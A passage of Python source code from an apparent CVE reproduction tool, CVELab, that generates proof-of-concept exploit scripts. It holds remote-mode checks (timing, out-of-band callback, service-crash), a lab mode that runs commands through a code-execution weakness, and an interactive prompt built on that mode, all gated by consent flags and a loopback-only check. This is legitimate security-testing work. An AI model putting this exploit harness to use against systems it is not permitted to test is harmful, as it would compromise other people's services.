          % (check["label"], fast, slow, ratio), file=sys.stderr)
    if show_bodies:
        print("            benign  %s" % ["%.3f" % t for t in control_times],
              file=sys.stderr)
        print("            payload %s" % ["%.3f" % t for t in probe_times],
              file=sys.stderr)
    if slow < check["min_seconds"]:
        print("  [NOT SLOW] the payload answered in %.3fs, under the %.3fs this check "
              "requires" % (slow, check["min_seconds"]), file=sys.stderr)
        return
    if ratio < check["min_ratio"]:
        print("  [NOT SLOW] %.1fx is under the %.1fx this check requires"
              % (ratio, check["min_ratio"]), file=sys.stderr)
        return
    if timed_out:
        print("  [STALLED] the payload never answered: %.3fs is this run's limit, against "
              "%.3fs for benign input of the same shape, via %s"
              % (slow, fast, check["label"]))
    else:
        print("  [STALLED] %.3fs against %.3fs for benign input of the same shape, %.1fx, "
              "via %s" % (slow, fast, ratio, check["label"]))
    findings.append({"check": check["label"], "where": ctx,
                     "payload_seconds": round(slow, 4),
                     "benign_seconds": round(fast, 4),
                     "ratio": round(ratio, 2),
                     "payload_never_answered": timed_out,
                     "measurements": len(probe_times)})


def _inputs(given):
    """The operator's NAME=VALUE pairs, checked against what the spec declares.

    Missing one is refused before the first request: the alternative is a run
    that sends {{credential}} literally and reports a clean target.
    """
    declared = list(SPEC.get("inputs") or [])
    supplied = {}
    for item in given:
        name, sep, value = str(item).partition("=")
        if not sep or not name:
            raise SystemExit("--input takes NAME=VALUE, not %r" % item)
        if name not in declared:
            raise SystemExit(
                "this PoC has no input %r; it needs: %s"
                % (name, ", ".join(declared) or "none")
            )
        supplied[name] = value
    missing = [name for name in declared if name not in supplied]
    if missing:
        raise SystemExit(
            "this PoC needs values it cannot know: %s. Pass each as --input NAME=VALUE"
            % ", ".join(missing)
        )
    return supplied


def main():
    p = argparse.ArgumentParser(
        description="CVELab PoC for @@CVE@@, remote mode",
        epilog=@@EPILOG@@,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("target_positional", nargs="?", metavar="TARGET",
                   help="One host you are permitted to test: 10.0.0.5:8080, "
                        "[2001:db8::1]:443 or https://app.example.com")
    p.add_argument("--target", help="The same target, named rather than positional")
    p.add_argument("--show-bodies", action="store_true",
                   help="Print each disclosed value in full instead of its first 120 characters")
    p.add_argument("--insecure", action="store_true", help="Skip TLS verification")
    p.add_argument("--timeout", type=int, default=30)
    p.add_argument("--read-timeout", type=int, default=5,
                   help="Seconds to wait on a quiet socket before moving on "
                        "(socket transports only; read_until ends a read at once)")
    p.add_argument("--json", action="store_true")
    p.add_argument("--input", action="append", default=[], metavar="NAME=VALUE",
                   help="A value this PoC needs and the lab could not know, such as a "
                        "test account's credential. Repeat for each one SPEC['inputs'] names")
    p.add_argument("--callback-bind", default="127.0.0.1:0",
                   help="Where this script listens for the target to call back "
                        "(oob_callback only; default an ephemeral loopback port)")
    p.add_argument("--callback",
                   help="How the target reaches that listener, e.g. 203.0.113.9:8000. "
                        "Defaults to the bound address, which only works when the target "
                        "can reach it directly")
    p.add_argument("--callback-wait", type=int, default=15,
                   help="Seconds to wait for the callback after the probe is sent")
    p.add_argument("--allow-disruption", action="store_true",
                   help="Required for a service_crash check: it is expected to stop the "
                        "service answering, and will not be sent without this")
    args = p.parse_args()
    where = args.target or args.target_positional
    if not where:
        p.error("name one target, as an argument or with --target")
    if args.target and args.target_positional:
        p.error("name the target once, not twice")
    oob = SPEC["strategy"] == "oob_callback"
    if SPEC["strategy"] == "service_crash" and not args.allow_disruption:
        # Refused, not reported as nothing found: the difference matters to
        # whoever reads the output. Every other strategy here asks no more of
        # the target than an ordinary request, and this one is the exception,
        # so it is the one thing this script will not do because it was told
        # to once.
        raise SystemExit(
            "This PoC demonstrates %s by stopping the service: the payload is expected\n"
            "to leave it not answering, and on anything shared or in production that is\n"
            "an outage. Re-run with --allow-disruption once you are on a host where that\n"
            "is acceptable and you are permitted to do it."
            % SPEC["observable_effect"]
        )
    # Checked before anything is printed or sent: learning halfway through a
    # run that a library is missing wastes the run and reads like a result.
    needed = {"ssh": "paramiko", "smb": "impacket.smbconnection"}.get(
        SPEC.get("transport", "http")
    )
    if needed:
        _require(needed, SPEC["transport"])
    target = Target(where, args.insecure, args.timeout, args.read_timeout)
    target.inputs = _inputs(args.input)
    print("target   %s" % target.base, file=sys.stderr)
    print("effect   %s" % SPEC["observable_effect"], file=sys.stderr)
    collector = None
    if oob:
        host, _, port = args.callback_bind.rpartition(":")
        try:
            collector = Collector(host or "127.0.0.1", int(port))
        except (OSError, ValueError) as error:
            raise SystemExit("cannot listen on %s: %s" % (args.callback_bind, error))
        target.collector = collector
        target.callback = args.callback or "%s:%s" % (collector.host, collector.port)
        target.callback_wait = args.callback_wait
        print("listen   %s:%s" % (collector.host, collector.port), file=sys.stderr)
        print("callback %s (what the payload tells the target to reach)"
              % target.callback, file=sys.stderr)
    findings = []
    run = {
        "inband_differential": _run_inband,
        "marker_roundtrip": _run_marker,
        "oob_callback": _run_oob,
        "direct_observation": _run_direct,
        "service_crash": _run_crash,
        "timing_differential": _run_timing,
    }[SPEC["strategy"]]
    try:
        return _check_all(target, args, findings, run)
    finally:
        if collector is not None:
            collector.close()


def _check_all(target, args, findings, run):
    for check in SPEC["checks"]:
        steps = check.get("discover", [])
        contexts = discover(target, steps)
        if steps and not contexts:
            # Sending the probe anyway left {{project}} in the request and
            # reported the empty result as a clean one. Finding nothing to
            # test is its own outcome.
            print("check    %s: nothing to test on this target" % check["label"],
                  file=sys.stderr)
            continue
        print("check    %s: %d target(s)" % (check["label"], len(contexts)), file=sys.stderr)
        for ctx in contexts:
            run(target, check, ctx, args.show_bodies, findings)
    observed = bool(findings)
    if args.json:
        print(json.dumps({"target": target.base, "strategy": SPEC["strategy"],
                          "observed": observed, "findings": findings}))
    print("%d finding(s)" % len(findings), file=sys.stderr)
    print("OBSERVED" if observed else "NOT_OBSERVED")
    return 0 if observed else 1
'''


#: The third way in, and the only one that reaches the lab program with an
#: argument.
#:
#: The command form was the carried validator's own: `PoC.py <addr> id` ran a
#: command through the weakness and printed its output. Measured on a freshly
#: generated code-execution lab it worked -- `uid=10001(app) gid=10001(app)
#: groups=10001(app)` -- and it was never proved against anything but this
#: lab's own route, because the lab adapter's path is a constant in the
#: validator. Aimed at a client it would send that route, find it absent and
#: print BLOCKED: a false negative dressed as a test, which is what a bare
#: address must not do.
#:
#: It is kept because showing impact is what it is for, and that is a job done
#: on a lab the operator brought up themselves, in front of a client. So it is
#: behind a flag that names the lab, refuses an address this lab cannot have
#: published, and says in its own help text what it cannot check. Emitted only
#: for a lab that declares a service port: the validator of a lab that does
#: not reads no argument at all, so the flag would silently run the
#: differential instead, which is worse than having no flag.
_POC_LAB_ADDRESS = '''import ipaddress

LAB_ADDRESS_HELP = (
@@HELP@@)


def _lab_address_given(argv):
    return any(
        item == "--lab-address" or item.startswith("--lab-address=")
        for item in argv[1:]
    )


def _loopback(host):
    """Whether this is an address this lab could have published.

    The one half of the question that can be answered here. `manual.sh`
    publishes 127.0.0.1 with the port left for the kernel, so a host that is
    not loopback is certainly not this lab's; which loopback port belongs to
    this lab is knowable only by asking Docker, which this script does not do.

    `localhost` is taken at its word and not resolved, so a machine whose
    hosts file points it somewhere else defeats this check. Resolving it
    would mean a DNS lookup before the refusal, and on a machine whose
    `localhost` is a lie the operator has already chosen that.
    """
    name = host.strip().lower()
    if name == "localhost":
        return True
    try:
        return ipaddress.ip_address(name).is_loopback
    except ValueError:
        return False


def _lab_address(argv):
    """argv rewritten into the form the lab program below already takes.

    The flag is stripped and the address left where that program reads it, so
    neither half of this file is a second implementation of the attack and the
    exit codes are the lab program's own.

    The flag is read only ahead of the command, and that is the whole of why
    this is a loop with a state in it rather than a scan. Read anywhere, a
    second spelling of the flag overwrote the address and left the command
    list empty -- so `--lab-address <addr> --lab-address=<addr>` handed the
    lab program an address and nothing else, which the contract defines as
    "run the lab's own harmless canary command". Measured: the command
    vanished and the file printed the canary's observation and REPRODUCED on
    stdout, exiting 0, for an argument the operator meant as a command. A
    status that says the proof succeeded for work nobody asked for is the one
    outcome this file must never produce, and it is reachable from any
    caller that passes text through -- which is what a prompt over this
    entry point does with every line it is typed.

    So: before the command begins the flag is the flag, and a second one
    there is ambiguous and refused rather than resolved. From the first word
    of the command onward every item is the command's, verbatim, flag-shaped
    or not. Nothing legitimate is lost -- the address has to precede what
    runs against it for the invocation to read as anything else.
    """
    rest, where = [], None
    items = list(argv[1:])
    index = 0
    while index < len(items):
        item = items[index]
        if rest:
            # The command has started. Everything from here is its own, and
            # an item that looks like a flag is a word in it.
            rest.append(item)
            index += 1
            continue
        if item == "--lab-address" or item.startswith("--lab-address="):
            if where is not None:
                print("--lab-address was given twice, before the command. Which address\\n"
                      "this is meant to reach cannot be guessed, so nothing was sent.\\n"
                      "Give it once, then the command: --lab-address ADDRESS [COMMAND].",
                      file=sys.stderr)
                raise SystemExit(2)
            if item == "--lab-address":
                index += 1
                where = items[index] if index < len(items) else None
            else:
                where = item.split("=", 1)[1]
        else:
            rest.append(item)
        index += 1
    if not where or where.startswith("-"):
        print("--lab-address takes the address this lab was published on, as\\n"
              "`bash manual.sh address <build>` prints it, and it is not optional:\\n"
              "with no argument at all this file runs the lab's own differential\\n"
              "inside the lab's network, which needs no address.", file=sys.stderr)
        raise SystemExit(2)
    if any(item.startswith("--input") for item in rest):
        # Which of the two the person wants decides what is being tested: an
        # application of theirs, or this lab. Guessing either way would run a
        # different test from the one they typed.
        print("--lab-address and --input are different jobs. --input belongs to remote\\n"
              "mode, which runs against an instance of yours and needs the route in it\\n"
              "that reaches the affected code. --lab-address runs against this lab's\\n"
              "own build, whose route is already a constant in the lab program. Drop\\n"
              "whichever is not the host you mean to test.", file=sys.stderr)
        raise SystemExit(2)
    host = where
    if host.startswith("["):
        host = host[1:].partition("]")[0]
    elif host.count(":") == 1:
        host = host.split(":")[0]
    if not _loopback(host):
        print("%s is not an address this lab published. This lab publishes on\\n"
              "loopback only -- `bash manual.sh address <build>` prints the port the\\n"
              "kernel assigned it -- and --lab-address reaches this lab's own build\\n"
              "and nothing else.\\n"
              "\\n"
              "To run against an instance you are permitted to test, there is remote\\n"
              "mode: one address and no --lab-address. The header of this file says\\n"
              "what that mode was proved against, or that it was not." % where,
              file=sys.stderr)
        raise SystemExit(2)
    return [argv[0], where, *rest]
'''


#: Remote mode where there is none: the few lines that stand in for the field
#: program when nothing was proved against a single instance.
#:
#: It refuses with the drafter's own recorded reason rather than a general
#: "not available", because the reason is the finding -- "a stock application
#: that calls the affected helper does not report that state" is what the
#: operator needs to repeat to a client, and it used to live only in
#: report.json, which nobody reads before a meeting. Exit 2: NOT_OBSERVED is
#: exit 1 and is a result, and this is not a result.
_POC_NO_REMOTE_MODE = '''import sys

REMOTE_MODE_REFUSED = (
@@REFUSAL@@)
'''


def _executes(plan: dict[str, Any] | None) -> bool:
    """Whether this lab's declared evidence is command execution.

    Read from the contract, never inferred. It decides one thing in two
    places -- the usage line and the sentence under it -- because the lab
    program takes a command after the address only for this shape, and
    offering one anywhere else describes an argument that is refused.
    """
    contract = (plan or {}).get("exploit_contract")
    contract = contract if isinstance(contract, dict) else {}
    return contract.get("evidence_type") == "code_execution"


def _lab_address_block(plan: dict[str, Any] | None, shell: bool = False) -> str:
    """The flag's own code and the `--help` paragraph under it, for this lab.

    The paragraph is wrapped here rather than hand-laid in the emitted text:
    one sentence of it is present only for a lab whose evidence is command
    execution, and a literal wrapped around the longer version printed a
    ragged block for every other lab.

    `shell` adds the prompt's own lines, because the prompt is reached
    through this flag rather than beside it: `--shell` without an address is
    refused by the same function that refuses `--lab-address` without one.
    """
    executes = _executes(plan)
    command = (
        " A second argument is one command to run on that build, delivered "
        "through the same weakness the differential proved, whose output it "
        "prints."
        if executes else ""
    )
    paragraph = _filled(
        "Runs the lab program in the lower half of this file against this lab's "
        "own build on ADDRESS, which is what `bash manual.sh address <build>` "
        f"prints after `setup`.{command} It reaches a build CVELab made and shows "
        "nothing about any other host, so it is for demonstrating the impact of a "
        "reproduction you brought up yourself.",
        width=74,
    )
    caveat = _filled(
        "ADDRESS has to be on loopback, because that is where this lab publishes. "
        "WHICH loopback port is this lab's is not something this file can check -- "
        "it asks Docker for nothing -- so pointing it at another service of your "
        "own is yours to answer for. For an instance that is not this lab's, there "
        "is remote mode above: one address, and no --lab-address.",
        width=74,
    )
    text = (
        "lab mode with an address:\n"
        f"  --lab-address ADDRESS{' [COMMAND]' if executes else ''}\n"
        + textwrap.indent(paragraph, "    ")
        + "\n"
        + textwrap.indent(caveat, "    ")
        + "\n"
    )
    if shell:
        text += (
            "\n"
            "lab mode at a prompt:\n"
            "  --lab-address ADDRESS --shell --allow-shell\n"
            + textwrap.indent(
                _filled(
                    "A prompt where every line you type is one more run of the form "
                    "above: one command through the same weakness, its output "
                    "printed, and nothing held open between lines. It is not a "
                    "session -- no persistent environment, no interactive programs, "
                    "no job control, no signals -- and `cd` is tracked by the prompt "
                    "itself rather than on the target. --allow-shell is required and "
                    "not implied: without it nothing is sent.",
                    width=74,
                ),
                "    ",
            )
            + "\n"
        )
    return _POC_LAB_ADDRESS.replace("@@HELP@@", _python_text(text))


#: The prompt. CVELab's own code, driving the lab program's own command form.
#:
#: The primitive the lower half proved is a request/response oracle, not a
#: channel: `--lab-address ADDRESS COMMAND` runs one command and exits. Both
#: halves are in one file, so the half above can run that form in a loop --
#: which is why there is no new entry point, no change to
#: `sourcegen._OPERATOR_CONTRACT`, and nothing here that delivers a command
#: itself. "Neither half of this file is a second implementation of the
#: attack" still holds, and so does "validator.py has two entry points and
#: must have exactly two".
#:
#: A subprocess rather than a call: the lab program is below the marker in
#: this same file, so there is nothing to import, and its address path builds
#: its own session per run -- every line is a fresh session whichever way it
#: is reached. The subprocess also keeps that program's exit status, which is
#: the one bit that says whether the command ran at all.
#:
#: `--lab-address` and never a bare address. `_poc_entry` sends a bare
#: argv[1] to remote mode's `main()`, which is a different program drafted
#: against a different spec; the flag is the one branch that falls through to
#: the lab program with the address where it reads it.
_POC_SHELL = '''import os, posixpath, re, shlex, subprocess, sys

SHELL_NOT_ALLOWED = (
@@NOT_ALLOWED@@)

SHELL_IS_NOT_ONE_COMMAND = (
@@ONE_COMMAND@@)

SHELL_OPENING = (
@@OPENING@@)

#: Cosmetic, and that is all it may ever be. The contract asks the lab
#: program to print the command's output under "a line saying it is the
#: command's output" and does not spell that line, so the two written to it
#: so far read "the following is the command output:" and "the following is
#: the command's output:".
#:
#: A first line that looks like that label is dropped and anything else is
#: printed whole, so this can lose a line of the drafter's prose. It can lose
#: output too -- a command whose own first line of output is that same label
#: loses it -- which is why the label is matched as a label and not as a
#: phrase: the whole line, and ending in the colon both written ones end in.
#: An output line is a line of output and almost never a caption for itself;
#: a header this misses is a header printed into the transcript, which is the
#: direction to miss in.
SHELL_HEADER_LINE = re.compile(r"(?i)^.{0,48}command.{0,12}output[^:\\n]{0,10}:\\s*$")

#: A `cd` the prompt tracks is one argument and nothing else. A line that
#: joins commands is sent as typed, where its `cd` is real and lasts exactly
#: as long as that one command -- which is what the prompt would be claiming
#: if it tracked it.
SHELL_JOINED = ("&&", "||", ";", "|", "&", ">", "<", "$(", "`")

#: The flags these modes take, which are stripped before the address is read
#: out of what is left. A mode added beside this one adds its own name here.
SHELL_FLAGS = ("--shell", "--allow-shell")

#: A line that the run this prompt makes would read as the address flag rather
#: than as the command, because the command is one argument of that run and
#: `_lab_address` reads every argument. `--lab-address=X` typed here used to
#: replace the address and leave the lab program with no command at all, which
#: prints that program's own differential where the command's output goes --
#: REPRODUCED, on stdout, at exit 0, for a line the operator typed as a
#: command. Refused by name instead, and nothing is sent.
SHELL_IS_THE_ADDRESS_FLAG = (
@@ADDRESS_FLAG@@)


def _shell_given(argv):
    return "--shell" in argv[1:]


def _shell_is_a_flag(sent):
    """Whether this line would be read as the address flag and not as a command."""
    return sent == "--lab-address" or sent.startswith("--lab-address=")


def _shell_allowed(argv, refusal):
    """The one flag that is not implied, for any mode that asks this much.

    Refused rather than reported as nothing found, which is the difference
    `--allow-disruption` draws for the one remote strategy that leaves the
    target worse than it found it. The refusal is the caller's, because what
    is being asked for is what the operator has to agree to.
    """
    if "--allow-shell" not in argv[1:]:
        sys.stderr.write(refusal)
        raise SystemExit(2)


def _shell_cd(cwd, where):
    """The directory the next command is prefixed with. Tracked here only.

    No argument means the directory the weakness itself runs in: there is no
    environment on this path to read a home directory out of, so `cd` with
    nothing after it returns to that rather than inventing one.
    """
    if not where:
        return ""
    return posixpath.normpath(posixpath.join(cwd, where))


def _shell_run(address, command):
    """One command, as one run of this same file in the form proved below."""
    return subprocess.run(
        [sys.executable, __file__, "--lab-address", address, command],
        capture_output=True, text=True,
    )


def _shell_said(done):
    """What the lab program said, printed as output only when it was output."""
    if done.returncode != 0:
        # Not output, and not printed where output goes: the lab program
        # exited non-zero, which on this form means the command did not run.
        # Its own stdout says why -- BLOCKED, or the observation it made --
        # and reading that as the command's answer is the one mistake a
        # prompt makes easy.
        sys.stderr.write(done.stderr)
        sys.stderr.write(done.stdout)
        sys.stderr.write(
            "[the command did not run: the lab program exited %d. What is above is\\n"
            "that program saying so, not output from the target.]\\n" % done.returncode
        )
        return
    printed = done.stdout
    first, newline, rest = printed.partition("\\n")
    if newline and SHELL_HEADER_LINE.search(first):
        printed = rest
    sys.stdout.write(printed)
    if printed and not printed.endswith("\\n"):
        sys.stdout.write("\\n")
    sys.stdout.flush()


def _shell_repl(address):
    """A prompt that looks like a terminal and is not one.

    Every line is one invocation. The limits are printed before the first
    prompt rather than discovered at it, because the shape of this mode is
    exactly what a terminal's shape implies and does not have.
    """
    sys.stderr.write(
        "%s --lab-address %s --shell: a prompt, not a session.\\n"
        % (os.path.basename(sys.argv[0]), address)
    )
    sys.stderr.write(SHELL_OPENING)
    sys.stderr.flush()
    cwd = ""
    while True:
        # The prompt is chrome and goes where this file's status already goes,
        # so stdout holds the commands' output and nothing else: a run of this
        # mode redirected to a file is a transcript of what the target said.
        # Which is also why this reads the line itself rather than through
        # input(), whose prompt goes to stdout.
        sys.stderr.write("lab %s [cd simulated] %s$ " % (address, cwd or "."))
        sys.stderr.flush()
        try:
            line = sys.stdin.readline()
        except KeyboardInterrupt:
            sys.stderr.write("\\n")
            continue
        if not line:
            # End of input, which is Ctrl-D at a terminal.
            sys.stderr.write("\\n")
            return 0
        line = line.strip()
        if not line:
            continue
        if line in ("exit", "quit"):
            return 0
        try:
            words = shlex.split(line)
        except ValueError:
            words = line.split()
        joined = any(item in line for item in SHELL_JOINED)
        if words and words[0] == "cd" and len(words) <= 2 and not joined:
            cwd = _shell_cd(cwd, words[1] if len(words) > 1 else "")
            continue
        sent = ("cd %s && " % shlex.quote(cwd) + line) if cwd else line
        if _shell_is_a_flag(sent):
            sys.stderr.write(SHELL_IS_THE_ADDRESS_FLAG)
            continue
        try:
            _shell_said(_shell_run(address, sent))
        except KeyboardInterrupt:
            sys.stderr.write(
                "\\n[stopped waiting. The command may still be running on the target:\\n"
                "this mode sends one request and has no signal to send after it.]\\n"
            )
        except OSError as error:
            # This mode runs this file again, so a prompt is also a prompt
            # that can fail to start a process. Said, and the prompt stays.
            sys.stderr.write(
                "[this file could not be run again to send that line: %s]\\n" % error
            )


def _shell_mode(argv):
    """The prompt, and every reason there is not one.

    The address, the loopback check and the refusal of `--input` are
    `_lab_address`'s, because they are the same questions about the same
    address: what this adds is the flag that has to be asked for and the
    refusal of a command that belongs to the one-command form.
    """
    _shell_allowed(argv, SHELL_NOT_ALLOWED)
    rest = [item for item in argv[1:] if item not in SHELL_FLAGS]
    where = _lab_address([argv[0], *rest])
    if len(where) > 2:
        sys.stderr.write(SHELL_IS_NOT_ONE_COMMAND)
        raise SystemExit(2)
    return _shell_repl(where[1])
'''


#: Refused rather than reported as nothing found, on the pattern
#: `--allow-disruption` set: every other mode in this file asks no more of
#: what it is pointed at than an ordinary request, and this one asks for
#: whatever the operator types next, for as long as they keep typing. So it
#: is the second thing this file will not do because it was told to once.
_SHELL_NOT_ALLOWED = (
    "--shell opens a prompt and delivers every line you type to this lab's build as "
    "a command, through the weakness this lab's differential proved. That is more "
    "than any other mode here asks of what it is pointed at: an ordinary request "
    "shows the effect once and stops. Re-run with --allow-shell once you are on a "
    "host where that is acceptable and you are permitted to do it."
)

#: The same shape as `--lab-address` refusing `--input`: which of the two the
#: person wants decides what runs, and guessing either way runs something
#: they did not type.
_SHELL_IS_NOT_ONE_COMMAND = (
    "--shell and a command on the command line are different jobs. A command there "
    "is the one-command form -- --lab-address ADDRESS COMMAND -- which runs that one "
    "command and exits, and is what a demonstration in front of someone watching "
    "uses. --shell asks for the commands at a prompt instead and runs each one "
    "through that same form. Drop whichever of the two you did not mean."
)

#: The one line this prompt will not deliver. The command is one argument of a
#: run of the form below, and that form reads every argument it is given, so a
#: line that is the address flag replaces the address and leaves the lab
#: program with no command -- which makes it print its own differential where
#: the command's output goes. Said here rather than sent.
_SHELL_IS_THE_ADDRESS_FLAG = (
    "That line is --lab-address itself, and this prompt cannot deliver it: your line "
    "is one argument of a run of the one-command form, and that form reads the flag "
    "wherever it appears. Sent, it would replace the address and run this lab's own "
    "differential with no command at all -- whose REPRODUCED would land where your "
    "command's output goes. Nothing was sent. The address is already fixed for this "
    "prompt; to point at another build, leave and start a new one. To run a command "
    "whose text begins that way, quote it -- `printf %s --lab-address=x`."
)


def _shell_where_you_are(plan: dict[str, Any] | None) -> str:
    """Whose route answers the commands, said before the first one is typed.

    Measured, which is why it is here at all, and stated as the universal it
    is rather than as a count: across the archive under benchmarks/labs,
    EVERY lab whose declared evidence is command execution and whose own
    differential held names something in `fidelity.simulated_components`, and
    the ones that also say `vendor_product_started` name an adapter as well.
    Not one exception -- on two independent passes that disagreed about how
    many labs there are, because "reproduced" can be read off `ok`, off
    `real_poc_verified`, or off the recorded status, and those give different
    totals. The universal survives all three readings. A total would have to
    name which reading it came from, and a number a reader cannot re-derive
    is the shape of claim that goes stale while still being quoted.

    So a prompt on such a lab is a prompt into a container CVELab's own model
    wrote around the vendor's code, and the honest version of that sentence
    is the lab's own words for it: the entry that declares the route, quoted,
    and the one thing the effect is evidence of.

    At a one-command echo the overstatement is small. At a prompt someone
    will believe they have seen real access, and will say so to a client.
    """
    plan = plan or {}
    fidelity = plan.get("fidelity")
    fidelity = fidelity if isinstance(fidelity, dict) else {}
    simulated = [
        " ".join(str(item).split())
        for item in (fidelity.get("simulated_components") or [])
        if str(item).strip()
    ]
    contract = plan.get("exploit_contract")
    contract = contract if isinstance(contract, dict) else {}
    summary = " ".join(str(contract.get("attack_summary") or "").split())
    repository = str(plan.get("repository") or "").strip()
    said = []
    if summary:
        said.append(
            _filled(
                "Your commands go to the route this lab's differential uses, which "
                f"this lab describes as: {summary}"
            )
        )
    if simulated:
        said.append(
            _filled(
                "This lab's own fidelity record declares that route simulated rather "
                "than the product's own, in these words:"
            )
        )
        said.extend(
            textwrap.indent(_filled(item, width=74), "    ") for item in simulated
        )
        said.append(
            _filled(
                "So what answers you is an adapter CVELab's model wrote"
                + (f" around {repository}" if repository else "")
                + ". The effect is evidence that the weakness is real in that code, "
                "and evidence of nothing at all about any other host: not this "
                "product in production, not a client's instance, not the machine "
                "this lab is running on."
            )
        )
    elif fidelity.get("vendor_product_started") is True:
        said.append(
            _filled(
                "This lab's fidelity record names no simulated component and records "
                "the vendor's own product starting, so the route is the product's "
                "own. It is still a build CVELab made and nothing else: the effect "
                "is evidence about this code, and evidence of nothing at all about "
                "any other host."
            )
        )
    else:
        # An empty simulated list is ambiguous, and this file already says so
        # where it hands the same field to a drafter: it can mean nothing was
        # simulated, which is the best case, or that the lab said nothing.
        # `vendor_product_started` is what tells them apart, and without it
        # the honest answer is not recorded -- not the product's own.
        # `deliverables._fidelity` resolves the same silence the same way,
        # assuming an unspecified adapter for a lab that recorded none.
        said.append(
            _filled(
                "This lab's fidelity record does not say what answers this route: it "
                "names no simulated component, and it does not record the vendor's "
                "own product starting either. Read that as not recorded rather than "
                "as the product's own -- every archived lab whose evidence is "
                "command execution had something CVELab built in front of the "
                "vendor's code. The effect is evidence about this code, and evidence "
                "of nothing at all about any other host: not this product in "
                "production, not a client's instance, not the machine this lab is "
                "running on."
            )
        )
    return "\n\n".join(said) + "\n"


def _shell_opening(plan: dict[str, Any] | None) -> str:
    """What the prompt says about itself before the first line is typed."""
    return (
        "\n"
        + _filled(
            "Each line you type is ONE command. This file is run again for that "
            "line, in the one-command form below, the command is delivered through "
            "the same weakness the differential proved, and its output is printed. "
            "Nothing is held open between lines, so:"
        )
        + "\n\n"
        + "\n".join(
            textwrap.fill(
                " ".join(item.split()), width=76, initial_indent="  ",
                subsequent_indent="    ", break_long_words=False,
                break_on_hyphens=False,
            )
            for item in (
                "* no persistent environment: a variable you export, a `su`, a "
                "`source`, an unlocked key is gone with the line that set it;",
                "* no interactive programs: an editor, a pager, a password prompt "
                "or anything else that waits for input never returns, and there is "
                "nothing to type into it;",
                "* no job control, no signals, and nothing here can stop a command "
                "once it has been sent;",
                "* no line editing and no history.",
            )
        )
        + "\n\n"
        + _filled(
            "`cd` is simulated, and simulated here rather than on the target: this "
            "prompt remembers the directory and prefixes `cd <dir> && ` to each "
            "line, which needs a shell on the other end of the weakness. The prompt "
            "shows `.` for whatever directory the weakness itself runs in, and `cd` "
            "with no argument returns to it."
        )
        + "\n\nWHERE YOU ACTUALLY ARE\n\n"
        + _shell_where_you_are(plan)
        + "\n"
        + _filled("Ctrl-D, `exit` or `quit` leaves.")
        + "\n\n"
    )


def _reads_a_second_positional(validator: str) -> bool:
    """Whether this validator reads a command as its second positional.

    Nothing in generation enforces the one-command form. `_OPERATOR_CONTRACT`
    asks for it in prose and `sourcegen._validate_generated` checks only that
    the bare token `sys.argv` occurs, so the second positional has no check
    behind it. Measured over the 232 archived validators: exactly two read a
    second positional, and they are the two whose plan declares a
    `service_port` -- that is, the two generated since the contract asked for
    one. Every other archived validator reads a single positional, so every
    other lab fails `takes_address` anyway and the form's absence there says
    nothing about the contract. Those two read it in two different shapes,
    `argv = sys.argv` then `argv[2]` and `address_mode(sys.argv[1:])` then
    `argv[1]`, which is why this is an AST walk and not a search for a
    spelling: a detector keyed on either one would have missed the other.
    A prompt over a form the lab program refuses is a prompt
    where every line exits 2, so the form is read out of the validator here
    and the mode is emitted only where it is found.

    Read conservatively, because the two costs are not symmetric: a false
    negative is a missing mode on a lab that would have supported it, and a
    false positive is a shipped shell that cannot work. So this looks for one
    thing -- an indexed read of the positional at argv[2], however the
    validator spells the way it got there -- through the three spellings in
    hand, which are those two labs and the fixture written to the contract by
    hand:

        argv = sys.argv ... argv[2]
        main(sys.argv) ... rest = argv[1:] ... rest[1]
        address_mode(sys.argv[1:]) ... argv[1]

    A slice is deliberately not an index here: `argv[2:]` is as often the
    refusal of an argument as the reading of one -- `if argv[2:]: usage()` --
    and a shell shipped on that reading would refuse every line it sent. A
    validator that reads its command only through a slice loses the mode and
    keeps everything else.
    """
    try:
        tree = ast.parse(validator)
    except SyntaxError:
        # The lower half may use syntax newer than the interpreter rendering
        # this kit, which is why `emit_poc` compiles only the upper half. No
        # mode, rather than a guess from the text.
        return False
    parameters: dict[str, list[str]] = {}
    for node in ast.walk(tree):
        if (
            isinstance(node, ast.FunctionDef | ast.AsyncFunctionDef)
            and node.name not in parameters
        ):
            parameters[node.name] = [
                item.arg for item in (node.args.posonlyargs + node.args.args)
            ]
    offsets: dict[str, int] = {}

    def bind(name: str, offset: int) -> None:
        # The smallest offset a name was ever given, so a name bound to both
        # `sys.argv` and a tail of it has to reach argv[2] either way.
        offsets[name] = min(offsets.get(name, offset), offset)

    # A pass per hop: a name is bound from argv, a second from a slice of
    # that name, a parameter from a call. Three hops is the deepest the
    # archive goes; the loop runs until nothing changes.
    for _ in range(8):
        before = dict(offsets)
        for node in ast.walk(tree):
            if isinstance(node, ast.Assign):
                offset = _argv_offset(node.value, offsets)
                if offset is not None:
                    for target in node.targets:
                        if isinstance(target, ast.Name):
                            bind(target.id, offset)
            elif isinstance(node, ast.Call):
                called = ""
                if isinstance(node.func, ast.Name):
                    called = node.func.id
                elif isinstance(node.func, ast.Attribute):
                    called = node.func.attr
                taken = parameters.get(called) or []
                for index, argument in enumerate(node.args):
                    offset = _argv_offset(argument, offsets)
                    if offset is not None and index < len(taken):
                        bind(taken[index], offset)
        if offsets == before:
            break
    for node in ast.walk(tree):
        if not isinstance(node, ast.Subscript):
            continue
        at = node.slice
        if not isinstance(at, ast.Constant) or not isinstance(at.value, int):
            continue
        if isinstance(at.value, bool) or at.value < 0:
            continue
        offset = _argv_offset(node.value, offsets)
        if offset is not None and offset + at.value >= 2:
            return True
    return False


def _argv_offset(node: ast.AST, offsets: dict[str, int]) -> int | None:
    """Which positional `node[0]` would be, when `node` is argv or a tail of it.

    0 for `sys.argv` itself, 1 for `sys.argv[1:]`, and None for anything this
    does not recognise as either -- which is the whole of the static reading
    `_reads_a_second_positional` does.
    """
    if isinstance(node, ast.Attribute):
        inner = node.value
        if node.attr == "argv" and isinstance(inner, ast.Name) and inner.id == "sys":
            return 0
        return None
    if isinstance(node, ast.Name):
        return offsets.get(node.id)
    if isinstance(node, ast.Subscript) and isinstance(node.slice, ast.Slice):
        cut = node.slice
        lower = cut.lower
        if cut.upper is not None or cut.step is not None:
            return None
        if not isinstance(lower, ast.Constant) or not isinstance(lower.value, int):
            return None
        if isinstance(lower.value, bool) or lower.value < 0:
            return None
        base = _argv_offset(node.value, offsets)
        return None if base is None else base + lower.value
    return None


def shell_standing(plan: dict[str, Any] | None, validator: str) -> tuple[bool, str]:
    """Whether this lab gets the prompt, and the reason where it does not.

    One function, so the artifact, its `--help` and anything written about it
